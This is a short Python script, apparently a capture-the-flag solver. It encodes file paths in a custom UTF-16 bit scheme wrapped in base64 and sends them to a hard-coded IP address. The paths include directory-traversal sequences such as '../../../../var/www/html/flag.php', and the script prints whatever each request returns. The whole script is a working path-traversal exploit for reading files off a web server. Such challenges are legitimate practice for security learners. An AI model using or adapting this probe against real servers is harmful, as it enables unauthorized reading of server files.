
import urllib.request
import urllib.error
import re
import base64

BASE = "http://18.217.64.238"

def encode_path(value):
    raw = value.encode("utf-16-be")
    bits = "".join(f"{b:08b}" for b in raw)
    data = "".join("E" if b == "0" else "e" for b in bits)
    return base64.b64encode(data.encode()).decode()

targets = [
    "pirate",
    "pirate.php",
    "flag",
    "flag.php",
    "../flag.php",
    "../../flag.php",
    "../../../flag.php",
    "../../../../var/www/html/flag.php",
]

for target in targets:
    token = encode_path(target)
    url = f"{BASE}/{token}"

    request = urllib.request.Request(
        url,
        headers={"User-Agent": "Mozilla/5.0"}
    )

    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            html = response.read().decode(
                "utf-8", errors="replace"
            )
            status = response.status

    except urllib.error.HTTPError as error:
        html = error.read().decode(
            "utf-8", errors="replace"
        )
        status = error.code

    jokes = re.findall(r"<h3>(.*?)</h3>", html, re.S)

    print(f"\n[+] Path: {target}")
    print(f"    HTTP: {status}")
    print(f"    Response: {jokes[0].strip() if jokes else 'EMPTY'}")
